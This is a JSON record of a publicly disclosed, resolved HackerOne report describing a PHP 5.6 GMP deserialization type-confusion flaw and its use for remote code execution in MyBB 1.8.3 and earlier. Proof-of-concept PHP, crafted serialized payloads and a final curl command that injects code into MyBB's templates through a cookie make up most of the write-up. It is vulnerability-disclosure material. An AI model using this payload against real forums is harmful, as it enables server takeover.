{
  "id": 198734,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTg3MzQ=",
  "url": "https://hackerone.com/reports/198734",
  "title": "GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2017-01-16T13:37:46.851Z",
  "submitted_at": "2017-01-16T13:37:46.851Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ryat",
    "url": "/ryat",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/wfyfjk9cawbuzqqdx88azrvxmqt6/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58?response-content-disposition=inline%3B%20filename%3D%22chtg.jpeg%22%3B%20filename%2A%3DUTF-8%27%27chtg.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU6SKXNFL%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T123303Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBsQY5L%2BFkxRPC58PY5o2r1B4FvJQHizPIG9rlwXtVRvAiAL0D5jMubGIu63HWEEj%2BrlMXD00CwCZl6n%2B2kgNXCz%2BSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIM9fJcytorMyA%2BJcGWKo8FlA6t%2FhW4ihTQDwTO66lwrpmBlh3InHCG7ZNyP57uNt%2FwRHIxvyi6PfiN2yoHKbnj3AHO%2B2d5zoBenUsjkTNVRrSUiifpdaXKnzF7u0bzX9wtP9298ZDuZh%2FGs9ROFHAwwSZO%2BvwKQLvQiKkud03lUkSsYAWSATrr7bzJ1TgRIshBwEoMxF63sGP9s7tsNfzRA%2BRBnErSD0VUQqi0BLoiz8aEpp9YWVfFSARTl85AS70jGdLFyjPSL3p4qQWEPUkiV0yqHhdAEAs09CT1fGjn4y7il2MxOD%2BwERRa3lBGnRAFCEqrktUlGxrk%2BtAvTc%2B7MYBNtBaSu88Qp3FBMeRxgNXuz4B4aE75hNE7hCdKjZkNp653DgLLcvSAVkWXKJ8bc7pY8EMi5I1A2Dl%2BW8ZHS7yWw13MauFUqTfpwfPhg4FrjlzkfofKeir9moM1Qw92DiMAzmXNA9VCWZgtwF9peq7cledMqKMhyz553%2BMG21%2FcYWqw%2FWqRrVoyVdqjqI8FKUBe%2BTS1SxpldVu8xEmCKzbfFzq%2FhT%2FkR7exoQXrx2l%2BL7t%2FuGgGEEKJunLBHXQWh79aKlW4%2FLY1zZRs3z63USsKCdupXOFqYSXN1SfICON%2Fqq6JqRCfisNv890YfHqytS0RRv6qX0n0SN%2BaUeTqSWHqTP0py0ZSVQX4asOO3F%2FAoFXsCcUW8Hln49ICQ0yyR%2Bcv27Gbe2FMzVWYlJHO79Zqq6ItXDPLhetwQl%2BNTdHzqrRFOsB9FNw7KlAliVAd2TMcGOIN3W1R76B95DRHTSvbmbHOhm%2FIFrdcghtBTzYBtLmNwUj6qld3rUi4V7xCIaxjyaDAD3J3BIh9Z56z79Puv7VTgcD1IbaGvCsbkTDaoa2uBjqyAfXgKJ7u1ZqUyaqlA35nJDggYhFUEhgBeS%2FonLnznw%2F8MZgMPwNTg9%2B%2BKneXQRJEmw0IxrRJCtp8dpbLw%2BejfQTVmdG%2FWK%2BDS%2FFX7U1sRmDMc%2FfmYPqycmml%2Bg9esPYXet%2FKlKaaFDXG3gzd7HfWF0%2BL5V0SyxaHdCxSBI4q4kLfNakyjwzmb4ALjzY0fA2TwRp16US2P1dwfWi2GjYsqaNGUOCV0dxXn6CrIbOv%2F%2Bk4ioM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=030d8e871e6d443712c074dee2b6b631e2024c94ae7d1863a68a88d77e5007b3"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU6SKXNFL%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T123303Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBsQY5L%2BFkxRPC58PY5o2r1B4FvJQHizPIG9rlwXtVRvAiAL0D5jMubGIu63HWEEj%2BrlMXD00CwCZl6n%2B2kgNXCz%2BSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIM9fJcytorMyA%2BJcGWKo8FlA6t%2FhW4ihTQDwTO66lwrpmBlh3InHCG7ZNyP57uNt%2FwRHIxvyi6PfiN2yoHKbnj3AHO%2B2d5zoBenUsjkTNVRrSUiifpdaXKnzF7u0bzX9wtP9298ZDuZh%2FGs9ROFHAwwSZO%2BvwKQLvQiKkud03lUkSsYAWSATrr7bzJ1TgRIshBwEoMxF63sGP9s7tsNfzRA%2BRBnErSD0VUQqi0BLoiz8aEpp9YWVfFSARTl85AS70jGdLFyjPSL3p4qQWEPUkiV0yqHhdAEAs09CT1fGjn4y7il2MxOD%2BwERRa3lBGnRAFCEqrktUlGxrk%2BtAvTc%2B7MYBNtBaSu88Qp3FBMeRxgNXuz4B4aE75hNE7hCdKjZkNp653DgLLcvSAVkWXKJ8bc7pY8EMi5I1A2Dl%2BW8ZHS7yWw13MauFUqTfpwfPhg4FrjlzkfofKeir9moM1Qw92DiMAzmXNA9VCWZgtwF9peq7cledMqKMhyz553%2BMG21%2FcYWqw%2FWqRrVoyVdqjqI8FKUBe%2BTS1SxpldVu8xEmCKzbfFzq%2FhT%2FkR7exoQXrx2l%2BL7t%2FuGgGEEKJunLBHXQWh79aKlW4%2FLY1zZRs3z63USsKCdupXOFqYSXN1SfICON%2Fqq6JqRCfisNv890YfHqytS0RRv6qX0n0SN%2BaUeTqSWHqTP0py0ZSVQX4asOO3F%2FAoFXsCcUW8Hln49ICQ0yyR%2Bcv27Gbe2FMzVWYlJHO79Zqq6ItXDPLhetwQl%2BNTdHzqrRFOsB9FNw7KlAliVAd2TMcGOIN3W1R76B95DRHTSvbmbHOhm%2FIFrdcghtBTzYBtLmNwUj6qld3rUi4V7xCIaxjyaDAD3J3BIh9Z56z79Puv7VTgcD1IbaGvCsbkTDaoa2uBjqyAfXgKJ7u1ZqUyaqlA35nJDggYhFUEhgBeS%2FonLnznw%2F8MZgMPwNTg9%2B%2BKneXQRJEmw0IxrRJCtp8dpbLw%2BejfQTVmdG%2FWK%2BDS%2FFX7U1sRmDMc%2FfmYPqycmml%2Bg9esPYXet%2FKlKaaFDXG3gzd7HfWF0%2BL5V0SyxaHdCxSBI4q4kLfNakyjwzmb4ALjzY0fA2TwRp16US2P1dwfWi2GjYsqaNGUOCV0dxXn6CrIbOv%2F%2Bk4ioM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fc5e8bf996f830b38708584dbbfe9d12a4a853dabfa4d15450f2971eed217647",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU6SKXNFL%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T123303Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBsQY5L%2BFkxRPC58PY5o2r1B4FvJQHizPIG9rlwXtVRvAiAL0D5jMubGIu63HWEEj%2BrlMXD00CwCZl6n%2B2kgNXCz%2BSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIM9fJcytorMyA%2BJcGWKo8FlA6t%2FhW4ihTQDwTO66lwrpmBlh3InHCG7ZNyP57uNt%2FwRHIxvyi6PfiN2yoHKbnj3AHO%2B2d5zoBenUsjkTNVRrSUiifpdaXKnzF7u0bzX9wtP9298ZDuZh%2FGs9ROFHAwwSZO%2BvwKQLvQiKkud03lUkSsYAWSATrr7bzJ1TgRIshBwEoMxF63sGP9s7tsNfzRA%2BRBnErSD0VUQqi0BLoiz8aEpp9YWVfFSARTl85AS70jGdLFyjPSL3p4qQWEPUkiV0yqHhdAEAs09CT1fGjn4y7il2MxOD%2BwERRa3lBGnRAFCEqrktUlGxrk%2BtAvTc%2B7MYBNtBaSu88Qp3FBMeRxgNXuz4B4aE75hNE7hCdKjZkNp653DgLLcvSAVkWXKJ8bc7pY8EMi5I1A2Dl%2BW8ZHS7yWw13MauFUqTfpwfPhg4FrjlzkfofKeir9moM1Qw92DiMAzmXNA9VCWZgtwF9peq7cledMqKMhyz553%2BMG21%2FcYWqw%2FWqRrVoyVdqjqI8FKUBe%2BTS1SxpldVu8xEmCKzbfFzq%2FhT%2FkR7exoQXrx2l%2BL7t%2FuGgGEEKJunLBHXQWh79aKlW4%2FLY1zZRs3z63USsKCdupXOFqYSXN1SfICON%2Fqq6JqRCfisNv890YfHqytS0RRv6qX0n0SN%2BaUeTqSWHqTP0py0ZSVQX4asOO3F%2FAoFXsCcUW8Hln49ICQ0yyR%2Bcv27Gbe2FMzVWYlJHO79Zqq6ItXDPLhetwQl%2BNTdHzqrRFOsB9FNw7KlAliVAd2TMcGOIN3W1R76B95DRHTSvbmbHOhm%2FIFrdcghtBTzYBtLmNwUj6qld3rUi4V7xCIaxjyaDAD3J3BIh9Z56z79Puv7VTgcD1IbaGvCsbkTDaoa2uBjqyAfXgKJ7u1ZqUyaqlA35nJDggYhFUEhgBeS%2FonLnznw%2F8MZgMPwNTg9%2B%2BKneXQRJEmw0IxrRJCtp8dpbLw%2BejfQTVmdG%2FWK%2BDS%2FFX7U1sRmDMc%2FfmYPqycmml%2Bg9esPYXet%2FKlKaaFDXG3gzd7HfWF0%2BL5V0SyxaHdCxSBI4q4kLfNakyjwzmb4ALjzY0fA2TwRp16US2P1dwfWi2GjYsqaNGUOCV0dxXn6CrIbOv%2F%2Bk4ioM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=364c7482c9967f631a4085dbc88b0f88032a7b6941d877304ab19fcdbc725ce7"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-10-13T11:11:07.711Z",
  "bug_reporter_agreed_on_going_public_at": "2019-10-13T11:11:07.653Z",
  "team_member_agreed_on_going_public_at": "2019-10-13T09:19:43.606Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "#GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]\n\nTaoguang Chen <[@chtg57](https://twitter.com/chtg57)> - Write Date: 2015.4.28\n\n> A type-confusion vulnerability was discovered in GMP deserialization with crafted object's __wakeup() magic method that can be abused for updating any already assigned properties of any already created objects, this result in serious security issues.\n\nAffected Versions\n------------\nAffected is PHP 5.6 < 5.6.30\n\nCredits\n------------\nThis vulnerability was disclosed by Taoguang Chen.\n\nDescription\n------------\ngmp.c\n```\nstatic int gmp_unserialize(zval **object, zend_class_entry *ce, const unsigned char *buf, zend_uint buf_len, zend_unserialize_data *data TSRMLS_DC) /* {{{ */\n{\n\t...\n\tALLOC_INIT_ZVAL(zv_ptr);\n\tif (!php_var_unserialize(&zv_ptr, &p, max, &unserialize_data TSRMLS_CC)\n\t\t|| Z_TYPE_P(zv_ptr) != IS_ARRAY\n\t) {\n\t\tzend_throw_exception(NULL, \"Could not unserialize properties\", 0 TSRMLS_CC);\n\t\tgoto exit;\n\t}\n\n\tif (zend_hash_num_elements(Z_ARRVAL_P(zv_ptr)) != 0) {\n\t\tzend_hash_copy(\n\t\t\tzend_std_get_properties(*object TSRMLS_CC), Z_ARRVAL_P(zv_ptr),\n\t\t\t(copy_ctor_func_t) zval_add_ref, NULL, sizeof(zval *)\n\t\t);\n\t}\n```\n\nzend_object_handlers.c\n```\nZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* {{{ */\n{\n\tzend_object *zobj;\n\tzobj = Z_OBJ_P(object);\n\tif (!zobj->properties) {\n\t\trebuild_object_properties(zobj);\n\t}\n\treturn zobj->properties;\n}\n```\n\nIt has been demonstrated many times before that __wakeup() or other magic methods leads to ZVAL was changed from the memory in during deserializtion. So an attacker can change **object into an integer-type or bool-type ZVAL, then the attacker will be able to access any objects that stored in objects store via Z_OBJ_P. This means the attacker will be able to update any properties in the object via zend_hash_copy(). It is possible to lead to various problems and including security issues.\n\nThe following codes will prove this vulnerability:\n```\n<?php\n\nclass obj\n{\n\tvar $ryat;\n\t\n\tfunction __wakeup()\n\t{\n\t\t$this->ryat = 1;\n\t}\n}\n\n$obj = new stdClass;\n$obj->aa = 1;\n$obj->bb = 2;\n\n$inner = 's:1:\"1\";a:3:{s:2:\"aa\";s:2:\"hi\";s:2:\"bb\";s:2:\"hi\";i:0;O:3:\"obj\":1:{s:4:\"ryat\";R:2;}}';\n$exploit = 'a:1:{i:0;C:3:\"GMP\":'.strlen($inner).':{'.$inner.'}}';\n$x = unserialize($exploit);\nvar_dump($obj);\n\n?>\n```\n\nExpected result:\n```\nobject(stdClass)#1 (2) {\n  [\"aa\"]=>\n  int(1)\n  [\"bb\"]=>\n  int(2)\n}\n```\n\nActual result:\n```\nobject(stdClass)#1 (3) {\n  [\"aa\"]=>\n  string(2) \"hi\"\n  [\"bb\"]=>\n  string(2) \"hi\"\n  [0]=>\n  object(obj)#3 (1) {\n    [\"ryat\"]=>\n    &int(1)\n  }\n}\n```\n\ni) How to exploited this bug in real world?\nOn php 5.6 <= 5.6.11, DateInterval's __wakeup() use convert_to_long() handles and reassignments its properties (it has been demonstrated many times), so an attacker can convert GMP object to an any integer-type ZVAL via GMP's gmp_cast_object():\n\n```\nstatic int gmp_cast_object(zval *readobj, zval *writeobj, int type TSRMLS_DC) /* {{{ */\n{\n    mpz_ptr gmpnum;\n    switch (type) {\n    ...\n    case IS_LONG:\n        gmpnum = GET_GMP_FROM_ZVAL(readobj);\n        INIT_PZVAL(writeobj);\n        ZVAL_LONG(writeobj, mpz_get_si(gmpnum));\n        return SUCCESS;\n```\n\nThe following codes will prove this exploite way:\n```\n<?php\n\nvar_dump(unserialize('a:2:{i:0;C:3:\"GMP\":17:{s:4:\"1234\";a:0:{}}i:1;O:12:\"DateInterval\":1:{s:1:\"y\";R:2;}}'));\n\n?>\n```\nOf course, a crafted __wakeup() can also be exploited, ex:\n\n```\n<?php\n\nfunction __wakeup()\n{\n    $this->ryat = (int) $this->ryat;\n}\n\n?>\n```\n\nii) Can be exploited this bug in real app?\n\nOn MyBB <= 1.8.3:\n\nindex.php\n```\n\tif(isset($mybb->cookies['mybb']['forumread']))\n\t{\n\t\t$forumsread = my_unserialize($mybb->cookies['mybb']['forumread']);\n\t}\n```\n\nMyBB <= 1.8.3 allow deserialized cookies via unserialize(), so an attacker will be able to update $mybb or other object's any properties, and it is possible to lead to security issues easily, ex: xss, sql injection, remote code execution and etc. :-)\n\nP.S. I had reported this vulnerability and it had been fixed in mybb >= 1.8.4.\n\nProof of Concept Exploit\n------------\nMyBB <= 1.8.3 RCE vulnerability\n\nindex.php\n```\neval('$index = \"'.$templates->get('index').'\";');\n```\n\nMyBB always use eval() function in during template parsing.\n\ninc/class_templates.php\n```\nclass templates\n{\n\t...\n\tpublic $cache = array();\n\t...\n\tfunction get($title, $eslashes=1, $htmlcomments=1)\n\t{\n\t\tglobal $db, $theme, $mybb;\n\t\t...\n\t\t$template = $this->cache[$title];\n\t\t...\n\t\treturn $template;\n\t}\n```\n\nIf we can control the `$cache`, we will be albe to inject php code via eval() function.\n\ninc/init.php\n```\n$error_handler = new errorHandler();\n...\n$maintimer = new timer();\n...\n$mybb = new MyBB;\n...\nswitch($config['database']['type'])\n{\n\tcase \"sqlite\":\n\t\t$db = new DB_SQLite;\n\t\tbreak;\n\tcase \"pgsql\":\n\t\t$db = new DB_PgSQL;\n\t\tbreak;\n\tcase \"mysqli\":\n\t\t$db = new DB_MySQLi;\n\t\tbreak;\n\tdefault:\n\t\t$db = new DB_MySQL;\n}\n...\n$templates = new templates;\n```\n\nThe `$templates` object was instantiated in init.php, and four objects was instantiated in this before. This means the `$templates` object's handle was set to 5 and stored into objects store, so we can access the `$templates` object and update the `$cache` property via convert GMP object into integer-type ZVAL that value is 5 in during GMP deserialization. This also means we can inject php code via eval() function.\n\nWhen MyBB <= 1.8.3 and PHP5.6 <= 5.6.11, remote code execution by just using curl on the command line:\n```\ncurl --cookie 'mybb[forumread]=a:1:{i:0%3bC:3:\"GMP\":106:{s:1:\"5\"%3ba:2:{s:5:\"cache\"%3ba:1:{s:5:\"index\"%3bs:14:\"{${phpinfo()}}\"%3b}i:0%3bO:12:\"DateInterval\":1:{s:1:\"y\"%3bR:2%3b}}}}' http://127.0.0.1/mybb/\n```",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-11-12T09:19:43.677Z",
  "allow_singular_disclosure_after": -134277200.32096976,
  "singular_disclosure_allowed": true,
  "vote_count": 68,
  "voters": [
    "jbreed",
    "sameerphad72",
    "xingguang",
    "doomf",
    "geeknik",
    "jackb898",
    "smodnix",
    "xaleraf4ra",
    "iohex",
    "broodkiller_",
    "and 58 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
